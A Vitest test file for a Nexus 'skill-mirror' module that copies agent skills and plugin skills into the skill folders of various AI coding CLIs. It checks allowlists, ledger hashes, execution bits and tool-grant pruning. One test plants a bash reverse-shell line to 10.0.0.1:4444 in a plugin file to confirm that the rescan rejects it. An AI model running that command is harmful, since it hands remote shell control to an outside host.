import { createHash } from 'node:crypto';
import { execFile } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { PLUGIN_MANIFEST_SCHEMA } from './agent-plugin-manifest';
import { IMPECCABLE_MANIFEST } from './impeccable-manifest';
import { parse as parseYaml } from 'yaml';
import {
  GENERATED_INLINE_SKILL_BODIES,
  bundledSkillSourceDir,
  DELIVERED_MANIFESTS,
  ensureSkillsForCli,
} from './skill-mirror';
import { BUNDLED_GUIDED_SKILLS } from './guided-squad-skills';

const jevSecrets = vi.hoisted(() => ({
  hasJevCredential: vi.fn(() => true),
}));
vi.mock('../jev/jev-secrets', () => ({
  hasJevCredential: jevSecrets.hasJevCredential,
}));

const roots: string[] = [];

function tmpRoot(): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'nexus-skill-mirror-'));
  roots.push(dir);
  return dir;
}

function writeSkill(root: string, name: string, body = '# Skill'): string {
  const dir = path.join(root, name);
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, 'SKILL.md'), body);
  return dir;
}

function writeAgentPlugin(home: string): void {
  const root = path.join(home, '.nexus', 'plugins', 'acme-tools');
  const skill = path.join(root, 'skills', 'review');
  fs.mkdirSync(skill, { recursive: true });
  fs.writeFileSync(
    path.join(root, 'plugin.json'),
    JSON.stringify({
      $schema: PLUGIN_MANIFEST_SCHEMA,
      name: 'acme-tools',
      version: '1.0.0',
      description: 'Acme tools',
    }),
  );
  fs.writeFileSync(
    path.join(skill, 'SKILL.md'),
    `---
name: review
description: Review code with Acme.
allowed-tools: Read Bash(git:*) nexus_file_read nexus_file_write nexus_git_push
---

Review the current diff.
`,
  );
  fs.writeFileSync(path.join(skill, 'reference.md'), 'safe asset');
}

beforeEach(() => {
  vi.stubEnv('MIMOCODE_HOME', '');
  vi.stubEnv('XDG_CONFIG_HOME', '');
});

afterEach(() => {
  vi.unstubAllEnvs();
  jevSecrets.hasJevCredential.mockReset().mockReturnValue(true);
  for (const root of roots.splice(0)) {
    fs.rmSync(root, { recursive: true, force: true });
  }
});

describe('ensureSkillsForCli', () => {
  it('delivers an executable REA helper that reports a missing runtime without starting installation', async () => {
    const home = tmpRoot();
    const target = path.join(tmpRoot(), 'session-skills');
    ensureSkillsForCli('codex', { home, sourceDirs: [], allowedSkills: ['rea'], targetDirs: [target], includeCliTarget: false });
    const helper = path.join(target, 'rea', 'scripts', 'rea-static.mjs');
    expect(fs.existsSync(helper)).toBe(true);
    // O helper recusa caminho com link no meio; no macOS o tmpdir passa por
    // /var -> /private/var, então o workspace entra pelo caminho real.
    const workspace = fs.realpathSync(tmpRoot());
    const result = await new Promise<{ code: number; stdout: string; stderr: string }>((resolve) => {
      execFile(process.execPath, [helper, 'status', '--workspace', workspace, '--runtime', path.join(workspace, 'missing-runtime')],
        { windowsHide: true, timeout: 10_000, maxBuffer: 64 * 1024 },
        (error, stdout, stderr) => resolve({ code: typeof error?.code === 'number' ? error.code : error ? -1 : 0, stdout, stderr }));
    });
    expect(result.code).toBe(1);
    expect(JSON.parse(result.stdout)).toMatchObject({ ok: false, code: 'runtime_missing', version: '6.7.0' });
    expect(result.stderr).toBe('');
    expect(fs.readdirSync(workspace)).toEqual([]);
  });

  it.each(['codex', 'claude', 'grok'])('materializes REA for %s without installing a global MCP server', (cli) => {
    const home = tmpRoot();
    const target = path.join(tmpRoot(), 'session-skills');
    ensureSkillsForCli(cli, {
      home,
      sourceDirs: [],
      allowedSkills: ['rea'],
      targetDirs: [target],
      includeCliTarget: false,
    });
    const body = fs.readFileSync(path.join(target, 'rea', 'SKILL.md'), 'utf8');
    const frontmatter = parseYaml(body.split('---')[1]) as { name: string; description: string };
    expect(frontmatter.name).toBe('rea');
    expect(frontmatter.description.length).toBeGreaterThan(20);
    expect(fs.existsSync(path.join(home, '.mcp.json'))).toBe(false);
    expect(fs.existsSync(path.join(home, '.codex', 'config.toml'))).toBe(false);
  });

  it('mirrors granted skills to the native MiMo config namespace', () => {
    const home = tmpRoot();
    writeSkill(path.join(home, '.agents', 'skills'), 'mimo-test-grant');
    ensureSkillsForCli('mimo-code', { home, allowedSkills: ['mimo-test-grant'] });
    expect(fs.readFileSync(path.join(home, '.config', 'mimocode', 'skills', 'mimo-test-grant', 'SKILL.md'), 'utf8')).toBe('# Skill');
  });

  it('honors the MiMo XDG config directory without writing to the default home', () => {
    const home = tmpRoot();
    const config = tmpRoot();
    vi.stubEnv('XDG_CONFIG_HOME', config);
    writeSkill(path.join(home, '.agents', 'skills'), 'mimo-xdg-grant');
    ensureSkillsForCli('mimo-code', { home, allowedSkills: ['mimo-xdg-grant'] });
    expect(fs.readFileSync(path.join(config, 'mimocode', 'skills', 'mimo-xdg-grant', 'SKILL.md'), 'utf8')).toBe('# Skill');
    expect(fs.existsSync(path.join(home, '.config', 'mimocode'))).toBe(false);
  });

  it.each(['outdated', 'missing'] as const)(
    'repairs a bundled helper that is %s even when SKILL.md already matches',
    (helperState) => {
      const home = tmpRoot();
      const generatedRoot = path.join(home, '.nexus', 'generated-skills');
      const skillDir = writeSkill(
        generatedRoot,
        'impeccable',
        IMPECCABLE_MANIFEST['SKILL.md']!.content,
      );
      const helper = 'scripts/VERSION';
      if (helperState === 'outdated') {
        fs.mkdirSync(path.dirname(path.join(skillDir, helper)), { recursive: true });
        fs.writeFileSync(path.join(skillDir, helper), '0.0.1\n');
      }
      const target = path.join(tmpRoot(), 'provider-skills');

      ensureSkillsForCli('codex', {
        home,
        sourceDirs: [],
        allowedSkills: ['impeccable'],
        targetDirs: [target],
        includeCliTarget: false,
      });

      const expected = IMPECCABLE_MANIFEST[helper]!.content;
      expect(fs.readFileSync(path.join(skillDir, helper), 'utf8')).toBe(expected);
      expect(fs.readFileSync(path.join(target, 'impeccable', helper), 'utf8'))
        .toBe(expected);
    },
  );

  it('keeps unchanged bundled helpers and customized provider copies intact', () => {
    const home = tmpRoot();
    const target = path.join(home, '.codex', 'skills');
    const custom = writeSkill(target, 'impeccable', '# My design workflow');
    fs.writeFileSync(path.join(custom, 'reference.md'), 'My own reference');
    const options = { home, sourceDirs: [], allowedSkills: ['impeccable'] };
    ensureSkillsForCli('codex', options);
    const generated = path.join(
      home, '.nexus', 'generated-skills', 'impeccable', 'scripts', 'VERSION',
    );
    const originalTime = new Date('2020-01-01T00:00:00.000Z');
    fs.utimesSync(generated, originalTime, originalTime);

    ensureSkillsForCli('codex', options);

    expect(fs.statSync(generated).mtimeMs).toBe(originalTime.getTime());
    expect(fs.readFileSync(path.join(custom, 'SKILL.md'), 'utf8'))
      .toBe('# My design workflow');
    expect(fs.readFileSync(path.join(custom, 'reference.md'), 'utf8'))
      .toBe('My own reference');
    expect(fs.existsSync(path.join(custom, 'scripts'))).toBe(false);
  });

  it('mirrors installed skills into the Codex namespace', () => {
    const home = tmpRoot();
    const source = tmpRoot();
    writeSkill(source, 'impeccable');

    const result = ensureSkillsForCli('codex', {
      home,
      sourceDirs: [source],
    });

    expect(result.mirrored).toBeGreaterThanOrEqual(2);
    expect(
      fs.existsSync(
        path.join(home, '.codex', 'skills', 'impeccable', 'SKILL.md'),
      ),
    ).toBe(true);
    expect(
      fs.existsSync(
        path.join(home, '.codex', 'skills', 'ponytail', 'SKILL.md'),
      ),
    ).toBe(true);
    expect(
      fs.existsSync(path.join(home, '.codex', 'skills', 'archify', 'SKILL.md')),
    ).toBe(true);
    expect(
      fs.existsSync(
        path.join(home, '.codex', 'skills', 'bmad-templates', 'SKILL.md'),
      ),
    ).toBe(true);
    expect(
      fs.existsSync(
        path.join(home, '.codex', 'skills', 'superpowers', 'SKILL.md'),
      ),
    ).toBe(true);
    expect(
      fs.existsSync(
        path.join(
          home,
          '.codex',
          'skills',
          'superpowers',
          'writing-plans',
          'SKILL.md',
        ),
      ),
    ).toBe(true);
    expect(
      fs.existsSync(
        path.join(home, '.codex', 'skills', 'grilling', 'SKILL.md'),
      ),
    ).toBe(true);
    expect(
      fs.existsSync(
        path.join(home, '.codex', 'skills', 'bridgeward', 'SKILL.md'),
      ),
    ).toBe(true);
    expect(
      fs.existsSync(
        path.join(home, '.codex', 'skills', 'bridgesecurity', 'SKILL.md'),
      ),
    ).toBe(true);
  });

  it('discovers a skill installed only in the Gemini namespace', () => {
    const home = tmpRoot();
    writeSkill(path.join(home, '.gemini', 'config', 'skills'), 'gemini-only');

    ensureSkillsForCli('codex', { home });

    expect(
      fs.existsSync(
        path.join(home, '.codex', 'skills', 'gemini-only', 'SKILL.md'),
      ),
    ).toBe(true);
  });

  it('honors an empty allowedSkills list as explicit no-skills policy', () => {
    const home = tmpRoot();
    const source = tmpRoot();
    writeSkill(source, 'impeccable');

    const result = ensureSkillsForCli('codex', {
      home,
      sourceDirs: [source],
      allowedSkills: [],
    });

    expect(result.mirrored).toBe(0);
    expect(fs.existsSync(path.join(home, '.codex', 'skills'))).toBe(false);
  });

  it('mirrors the exact granted set into the Codex governed namespace', () => {
    const home = tmpRoot();
    const source = tmpRoot();
    writeSkill(source, 'check-work');
    writeSkill(source, 'blocked');

    ensureSkillsForCli('codex', {
      home,
      sourceDirs: [source],
      allowedSkills: ['impeccable', 'check-work', 'not-installed'],
    });

    const target = path.join(home, '.codex', 'skills');
    expect(fs.readdirSync(target).sort()).toEqual([
      'check-work',
      'impeccable',
    ]);
    expect(fs.existsSync(path.join(target, 'blocked'))).toBe(false);
    expect(fs.existsSync(path.join(target, 'not-installed'))).toBe(false);
  });

  it('materializes the governed Nexus visual skill without private imagegen dependencies', () => {
    const home = tmpRoot();
    const isolated = path.join(tmpRoot(), 'provider-skills');

    ensureSkillsForCli('codex', {
      home,
      sourceDirs: [],
      allowedSkills: ['nexus-visual-media'],
      targetDirs: [isolated],
      includeCliTarget: false,
    });

    const target = path.join(
      isolated,
      'nexus-visual-media',
      'SKILL.md',
    );
    const body = fs.readFileSync(target, 'utf8');
    expect(body).toContain('nexus_media_providers');
    expect(body).toContain('nexus_image_generate');
    expect(body).toContain('Do not use native image-generation tools');
    // F-1598: a escolha sai dos campos que a ferramenta devolve, não da memória.
    for (const field of ['imageCostUsd', 'videoModels', 'durationsSeconds', 'retired', 'defaults']) {
      expect(body, field).toContain(`\`${field}\``);
    }
    expect(body).toMatch(/not\s+quality/);
    expect(body).toContain('Ajustes → Serviços de mídia');
    expect(fs.existsSync(path.join(isolated, 'imagegen'))).toBe(false);
    expect(fs.existsSync(path.join(isolated, 'hatch-pet'))).toBe(false);
  });

  it('materializes the dedicated Pet Studio workflow entirely inside the workspace', () => {
    const home = tmpRoot();
    const isolated = path.join(tmpRoot(), 'provider-skills');

    ensureSkillsForCli('codex', {
      home,
      sourceDirs: [],
      allowedSkills: ['nexus-pet-studio'],
      targetDirs: [isolated],
      includeCliTarget: false,
    });

    const body = fs.readFileSync(
      path.join(isolated, 'nexus-pet-studio', 'SKILL.md'),
      'utf8',
    );
    expect(body).toContain(
      'artifacts/nexus-pet-studio/<missionId>/<pet-id>',
    );
    expect(body).toContain('8-column × 11-row');
    expect(body).toContain('Never write to `~/.codex/pets`');
    expect(body).toContain('nexus_image_generate');
    expect(body).toContain('load_workspace_dependencies');
  });

  it('copies only allowlisted skills when a skill allowlist is present', () => {
    const home = tmpRoot();
    const source = tmpRoot();
    writeSkill(source, 'impeccable');
    writeSkill(source, 'security-best-practices');

    ensureSkillsForCli('agy', {
      home,
      sourceDirs: [source],
      allowedSkills: ['impeccable'],
    });

    const target = path.join(home, '.gemini', 'antigravity', 'skills');
    expect(fs.existsSync(path.join(target, 'impeccable', 'SKILL.md'))).toBe(
      true,
    );
    expect(
      fs.existsSync(path.join(target, 'security-best-practices', 'SKILL.md')),
    ).toBe(false);
    expect(fs.existsSync(path.join(target, 'ponytail', 'SKILL.md'))).toBe(
      false,
    );
  });

  it('mirrors into Claude ephemeral homes for gated Claude-like workers', () => {
    const home = tmpRoot();
    const ephemeral = tmpRoot();
    const source = tmpRoot();
    writeSkill(source, 'impeccable');

    ensureSkillsForCli('claude', {
      home,
      sourceDirs: [source],
      ephemeralHomeDir: ephemeral,
    });

    expect(
      fs.existsSync(
        path.join(ephemeral, '.claude', 'skills', 'impeccable', 'SKILL.md'),
      ),
    ).toBe(true);
    expect(
      fs.existsSync(
        path.join(home, '.claude', 'skills', 'impeccable', 'SKILL.md'),
      ),
    ).toBe(true);
  });

  it('mirrors Kimi skills to the Kimi user skill directory without argv changes', () => {
    const home = tmpRoot();
    const source = tmpRoot();
    writeSkill(source, 'impeccable');

    const result = ensureSkillsForCli('kimi', {
      home,
      sourceDirs: [source],
    });

    expect(result.targetDirs).toContain(
      path.join(home, '.kimi-code', 'skills'),
    );
    expect(
      fs.existsSync(
        path.join(home, '.kimi-code', 'skills', 'impeccable', 'SKILL.md'),
      ),
    ).toBe(true);
  });

  it('mirrors OpenCode skills to its official user skill directory', () => {
    const home = tmpRoot();
    const source = tmpRoot();
    writeSkill(source, 'impeccable');

    const result = ensureSkillsForCli('opencode', {
      home,
      sourceDirs: [source],
    });

    expect(result.targetDirs).toContain(
      path.join(home, '.config', 'opencode', 'skills'),
    );
    expect(
      fs.existsSync(
        path.join(
          home,
          '.config',
          'opencode',
          'skills',
          'impeccable',
          'SKILL.md',
        ),
      ),
    ).toBe(true);
  });

  it('writes only granted skills to an isolated governed target', () => {
    const home = tmpRoot();
    const source = tmpRoot();
    const isolated = path.join(tmpRoot(), 'provider-skills');
    writeSkill(source, 'allowed');
    writeSkill(source, 'blocked');

    const result = ensureSkillsForCli('codex', {
      home,
      sourceDirs: [source],
      allowedSkills: ['allowed'],
      targetDirs: [isolated],
      includeCliTarget: false,
    });

    expect(result.targetDirs).toEqual([isolated]);
    expect(fs.existsSync(path.join(isolated, 'allowed', 'SKILL.md'))).toBe(
      true,
    );
    expect(fs.existsSync(path.join(isolated, 'blocked'))).toBe(false);
    expect(fs.existsSync(path.join(home, '.codex', 'skills'))).toBe(false);
  });

  it('makes an ingested plugin skill invocable granting every requested Nexus tool and no native entry', () => {
    const home = tmpRoot();
    const isolated = path.join(tmpRoot(), 'provider-skills');
    writeAgentPlugin(home);

    const result = ensureSkillsForCli('codex', {
      home,
      sourceDirs: [],
      allowedSkills: ['acme-tools:review'],
      allowedTools: ['nexus_file_read'],
      targetDirs: [isolated],
      includeCliTarget: false,
    });

    const target = path.join(isolated, 'acme-tools-review');
    const materialized = fs.readFileSync(path.join(target, 'SKILL.md'), 'utf8');
    expect(materialized).toContain('name: acme-tools-review');
    // F-1157: o gate não nega mais tool do Nexus, então a linha materializada
    // carrega todas as que a skill pede; as entradas nativas seguem removidas.
    expect(materialized).toContain(
      'allowed-tools: nexus_file_read nexus_file_write nexus_git_push',
    );
    expect(materialized).not.toContain('Bash(git:*)');
    expect(materialized).not.toMatch(/allowed-tools:.*\bRead\b/u);
    expect(fs.readFileSync(path.join(target, 'reference.md'), 'utf8')).toBe(
      'safe asset',
    );
    expect(result.copied).toContainEqual({
      name: 'acme-tools-review',
      targetDir: isolated,
    });
    expect(result.pluginReductions).toContainEqual(
      expect.objectContaining({
        qualifiedName: 'acme-tools:review',
        granted: ['nexus_file_read', 'nexus_file_write', 'nexus_git_push'],
        removed: ['Read', 'Bash(git:*)'],
      }),
    );
  });

  it('re-escaneia os bytes que copia: atualização hostil dentro do TTL do scan não chega ao provider (L7)', () => {
    const home = tmpRoot();
    writeAgentPlugin(home);
    const options = (target: string) => ({
      home,
      sourceDirs: [],
      allowedSkills: ['acme-tools:review'],
      allowedTools: ['nexus_file_read'],
      targetDirs: [target],
      includeCliTarget: false,
    });
    const first = path.join(tmpRoot(), 'provider-a');
    ensureSkillsForCli('codex', options(first));
    expect(fs.existsSync(path.join(first, 'acme-tools-review', 'reference.md'))).toBe(true);

    // Atualização do plugin dentro da janela de 60 s do cache de scan.
    fs.writeFileSync(
      path.join(home, '.nexus', 'plugins', 'acme-tools', 'skills', 'review', 'reference.md'),
      'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
    );
    const second = path.join(tmpRoot(), 'provider-b');
    const result = ensureSkillsForCli('codex', options(second));

    expect(fs.existsSync(path.join(second, 'acme-tools-review'))).toBe(false);
    expect(fs.readdirSync(second).filter((name) => name.includes('acme-tools'))).toEqual([]);
    expect(result.pluginFailures).toContainEqual(expect.objectContaining({
      qualifiedName: 'acme-tools:review',
      reason: expect.stringMatching(/hostil/i),
    }));
  });
});

describe('bundled skill delivery', () => {
  it.skipIf(process.platform === 'win32')(
    'materializes the vendored impeccable CLI with its execution bit',
    () => {
      const home = tmpRoot();
      const target = path.join(tmpRoot(), 'provider-skills');

      ensureSkillsForCli('codex', {
        home,
        sourceDirs: [],
        allowedSkills: ['impeccable'],
        targetDirs: [target],
        includeCliTarget: false,
      });

      const cli = path.join(target, 'impeccable', 'scripts', 'impeccable');
      expect(fs.statSync(cli).mode & 0o111).not.toBe(0);
      expect(fs.readFileSync(cli, 'utf8')).toBe(
        IMPECCABLE_MANIFEST['scripts/impeccable']!.content,
      );
    },
  );

  it.skipIf(process.platform === 'win32')(
    'repairs the execution bit when an identical helper has the wrong mode',
    () => {
      const home = tmpRoot();
      const cli = path.join(
        home, '.nexus', 'generated-skills', 'impeccable', 'scripts', 'impeccable',
      );
      fs.mkdirSync(path.dirname(cli), { recursive: true });
      fs.writeFileSync(cli, IMPECCABLE_MANIFEST['scripts/impeccable']!.content);
      fs.chmodSync(cli, 0o644);
      const target = path.join(tmpRoot(), 'provider-skills');

      ensureSkillsForCli('codex', {
        home,
        sourceDirs: [],
        allowedSkills: ['impeccable'],
        targetDirs: [target],
        includeCliTarget: false,
      });

      expect(fs.statSync(cli).mode & 0o111).not.toBe(0);
      expect(
        fs.statSync(path.join(target, 'impeccable', 'scripts', 'impeccable')).mode
          & 0o111,
      ).not.toBe(0);
    },
  );

  it('prunes files the bundle no longer ships from the Main-owned cache', () => {
    const home = tmpRoot();
    const cached = path.join(home, '.nexus', 'generated-skills', 'impeccable');
    const obsolete = path.join(cached, 'scripts', 'legacy-helper.mjs');
    fs.mkdirSync(path.dirname(obsolete), { recursive: true });
    fs.writeFileSync(obsolete, '// dropped from the bundle');
    const target = path.join(tmpRoot(), 'provider-skills');

    ensureSkillsForCli('codex', {
      home,
      sourceDirs: [],
      allowedSkills: ['impeccable'],
      targetDirs: [target],
      includeCliTarget: false,
    });

    expect(fs.existsSync(obsolete)).toBe(false);
    expect(fs.existsSync(path.join(cached, 'SKILL.md'))).toBe(true);
    expect(fs.existsSync(path.join(cached, 'scripts', 'VERSION'))).toBe(true);
  });

  it('refreshes a bundled provider copy that an older release delivered', () => {
    const home = tmpRoot();
    const target = path.join(tmpRoot(), 'provider-skills');
    const options = {
      home,
      sourceDirs: [],
      allowedSkills: ['impeccable'],
      targetDirs: [target],
      includeCliTarget: false,
    };
    ensureSkillsForCli('codex', options);
    const skillDir = path.join(target, 'impeccable');
    const version = path.join(skillDir, 'scripts', 'VERSION');
    fs.writeFileSync(version, '0.0.1\n');
    fs.writeFileSync(path.join(skillDir, 'SKILL.md'), '# impeccable from an older release');

    ensureSkillsForCli('codex', options);

    expect(fs.readFileSync(version, 'utf8')).toBe(
      IMPECCABLE_MANIFEST['scripts/VERSION']!.content,
    );
    // O entregue é o podado: o 4.7.0 declara allowed-tools e o pane não o recebe.
    expect(fs.readFileSync(path.join(skillDir, 'SKILL.md'), 'utf8')).toBe(
      DELIVERED_MANIFESTS.impeccable['SKILL.md']!.content,
    );
  });

  it('adopts a pre-ledger provider copy by recognizing its carried-over assets', () => {
    const home = tmpRoot();
    const target = path.join(tmpRoot(), 'provider-skills');
    const skillDir = path.join(target, 'impeccable');
    fs.mkdirSync(path.join(skillDir, 'scripts'), { recursive: true });
    // An install from an older Nexus, before any ledger existed: the headline
    // document has since been rewritten, but the small carried-over assets are
    // byte-identical. That is what identifies it as our delivery rather than a
    // skill the user wrote by hand.
    fs.writeFileSync(path.join(skillDir, 'SKILL.md'), '# impeccable (old release)');
    fs.writeFileSync(
      path.join(skillDir, 'NOTICE.md'),
      IMPECCABLE_MANIFEST['NOTICE.md']!.content,
    );
    fs.writeFileSync(path.join(skillDir, 'scripts', 'VERSION'), '0.0.1\n');

    ensureSkillsForCli('codex', {
      home,
      sourceDirs: [],
      allowedSkills: ['impeccable'],
      targetDirs: [target],
      includeCliTarget: false,
    });

    // O entregue é o podado: o 4.7.0 declara allowed-tools e o pane não o recebe.
    expect(fs.readFileSync(path.join(skillDir, 'SKILL.md'), 'utf8')).toBe(
      DELIVERED_MANIFESTS.impeccable['SKILL.md']!.content,
    );
    expect(fs.readFileSync(path.join(skillDir, 'scripts', 'VERSION'), 'utf8')).toBe(
      IMPECCABLE_MANIFEST['scripts/VERSION']!.content,
    );
  });

  it('keeps provider files that Nexus did not write', () => {
    const home = tmpRoot();
    const target = path.join(tmpRoot(), 'provider-skills');
    const options = {
      home,
      sourceDirs: [],
      allowedSkills: ['impeccable'],
      targetDirs: [target],
      includeCliTarget: false,
    };
    ensureSkillsForCli('codex', options);
    const mine = path.join(target, 'impeccable', 'notes.md');
    fs.writeFileSync(mine, 'local note');

    ensureSkillsForCli('codex', options);

    expect(fs.readFileSync(mine, 'utf8')).toBe('local note');
  });

  it('keeps a delivered file that the user has since edited', () => {
    const home = tmpRoot();
    const target = path.join(tmpRoot(), 'provider-skills');
    const options = {
      home,
      sourceDirs: [],
      allowedSkills: ['impeccable'],
      targetDirs: [target],
      includeCliTarget: false,
    };
    ensureSkillsForCli('codex', options);
    // Record it as ours, then edit it: the ledger's hash guard must refuse to
    // delete work the user has put into it.
    const handled = path.join(target, 'impeccable', 'handled.md');
    fs.writeFileSync(handled, 'as delivered');
    const ledgerFile = path.join(
      home, '.nexus', 'generated-skills', '.nexus-managed.json',
    );
    const ledger = JSON.parse(fs.readFileSync(ledgerFile, 'utf8'));
    ledger.skills.impeccable['handled.md'] = createHash('sha256')
      .update('as delivered')
      .digest('hex');
    fs.writeFileSync(ledgerFile, JSON.stringify(ledger));
    fs.writeFileSync(handled, 'edited by the user');

    ensureSkillsForCli('codex', options);

    expect(fs.readFileSync(handled, 'utf8')).toBe('edited by the user');
  });

  it('leaves a locally authored skill untouched', () => {
    const home = tmpRoot();
    const target = path.join(tmpRoot(), 'provider-skills');
    const local = writeSkill(target, 'my-local-skill', '# Mine');

    ensureSkillsForCli('codex', {
      home,
      sourceDirs: [target],
      allowedSkills: ['my-local-skill'],
      targetDirs: [target],
      includeCliTarget: false,
    });

    expect(fs.readFileSync(path.join(local, 'SKILL.md'), 'utf8')).toBe('# Mine');
  });

  it('drops the bundled typesafe-ai when no TypeSafe credential exists', () => {
    jevSecrets.hasJevCredential.mockReturnValue(false);
    const home = tmpRoot();
    const target = path.join(home, '.codex', 'skills');

    ensureSkillsForCli('codex', { home, sourceDirs: [] });

    expect(fs.existsSync(path.join(target, 'typesafe-ai', 'SKILL.md'))).toBe(false);
    // Outros bundled skills seguem sendo espelhados normalmente.
    expect(fs.existsSync(path.join(target, 'impeccable', 'SKILL.md'))).toBe(true);
  });

  it('keeps a user-installed typesafe-ai even without credential', () => {
    jevSecrets.hasJevCredential.mockReturnValue(false);
    const home = tmpRoot();
    const userSource = tmpRoot();
    writeSkill(userSource, 'typesafe-ai', '# My own typesafe skill');
    const target = path.join(home, '.codex', 'skills');

    ensureSkillsForCli('codex', { home, sourceDirs: [userSource] });

    expect(fs.readFileSync(path.join(target, 'typesafe-ai', 'SKILL.md'), 'utf8'))
      .toBe('# My own typesafe skill');
  });

  it('mirrors the bundled typesafe-ai when a credential exists', () => {
    const home = tmpRoot();
    const target = path.join(home, '.codex', 'skills');

    ensureSkillsForCli('codex', { home, sourceDirs: [] });

    expect(fs.existsSync(path.join(target, 'typesafe-ai', 'SKILL.md'))).toBe(true);
  });

  describe('bundledSkillSourceDir (F-641)', () => {
    it('toda skill que o app declara embarcada existe no bundle materializado', () => {
      const generatedRoot = path.join(tmpRoot(), 'generated-skills');
      const missing = BUNDLED_GUIDED_SKILLS.filter(
        (name) => bundledSkillSourceDir(name, generatedRoot) === null,
      );
      expect(missing).toEqual([]);
    });

    it('materializa a skill de papel a partir do manifesto, sem pasta solta no pacote', () => {
      const generatedRoot = path.join(tmpRoot(), 'generated-skills');
      const dir = bundledSkillSourceDir('oc-pilot', generatedRoot);
      expect(dir).toBe(path.join(generatedRoot, 'oc-pilot'));
      expect(fs.readFileSync(path.join(dir!, 'SKILL.md'), 'utf8')).toMatch(/oc-pilot/);
    });

    it('nome fora do bundle não vira fonte', () => {
      expect(bundledSkillSourceDir('users-personal-skill', path.join(tmpRoot(), 'g'))).toBeNull();
    });
  });

  describe('repeated spawns', () => {
    const largestAsset = Object.keys(IMPECCABLE_MANIFEST).sort(
      (a, b) =>
        IMPECCABLE_MANIFEST[b]!.content.length - IMPECCABLE_MANIFEST[a]!.content.length,
    )[0]!;
    const largestBytes = Buffer.from(
      IMPECCABLE_MANIFEST[largestAsset]!.content,
      IMPECCABLE_MANIFEST[largestAsset]!.encoding,
    );
    const endsWithAsset = (file: unknown): boolean =>
      String(file).endsWith(path.join(...largestAsset.split('/')));

    it('neither re-reads nor rewrites unchanged bundled assets on the next spawn', () => {
      const home = tmpRoot();
      const options = { home, sourceDirs: [], ephemeralHomeDir: tmpRoot() };
      ensureSkillsForCli('claude', options);
      const reads = vi.spyOn(fs, 'readFileSync');
      const writes = vi.spyOn(fs, 'writeFileSync');
      try {
        ensureSkillsForCli('claude', options);
        expect(reads.mock.calls.filter(([file]) => endsWithAsset(file))).toEqual([]);
        expect(writes.mock.calls.filter(([file]) => endsWithAsset(file))).toEqual([]);
      } finally {
        reads.mockRestore();
        writes.mockRestore();
      }
    });

    it('repairs a bundled asset overwritten with same-size bytes', () => {
      const home = tmpRoot();
      const options = { home, sourceDirs: [], allowedSkills: ['impeccable'] };
      ensureSkillsForCli('codex', options);
      const generated = path.join(
        home, '.nexus', 'generated-skills', 'impeccable', ...largestAsset.split('/'),
      );
      fs.writeFileSync(generated, Buffer.alloc(largestBytes.length, 0x78));

      ensureSkillsForCli('codex', options);

      expect(fs.readFileSync(generated).equals(largestBytes)).toBe(true);
    });

    it('clones a fresh overlay copy from the verified generated root', () => {
      const home = tmpRoot();
      ensureSkillsForCli('claude', { home, sourceDirs: [], ephemeralHomeDir: tmpRoot() });
      const overlay = tmpRoot();
      const copies = vi.spyOn(fs, 'copyFileSync');
      try {
        ensureSkillsForCli('claude', { home, sourceDirs: [], ephemeralHomeDir: overlay });
        const target = path.join(
          overlay, '.claude', 'skills', 'impeccable', ...largestAsset.split('/'),
        );
        expect(copies.mock.calls.some(([, dest]) => String(dest) === target)).toBe(true);
        expect(fs.readFileSync(target).equals(largestBytes)).toBe(true);
        if (IMPECCABLE_MANIFEST[largestAsset]!.executable && process.platform !== 'win32') {
          expect(fs.statSync(target).mode & 0o111).not.toBe(0);
        }
      } finally {
        copies.mockRestore();
      }
    });
  });
});

describe('generated inline skills', () => {
  // Kimi (PyYAML) and OpenCode (js-yaml) parse SKILL.md frontmatter strictly:
  // an unquoted ": " inside the description drops the whole skill there.
  it.each(Object.entries(GENERATED_INLINE_SKILL_BODIES))('%s frontmatter is strict YAML', (name, body) => {
    const block = /^---\n([\s\S]*?)\n---/.exec(body)?.[1];
    expect(block).toBeDefined();
    const meta = parseYaml(block!) as { name?: unknown; description?: unknown };
    expect(meta.name).toBe(name);
    expect(typeof meta.description).toBe('string');
  });
});
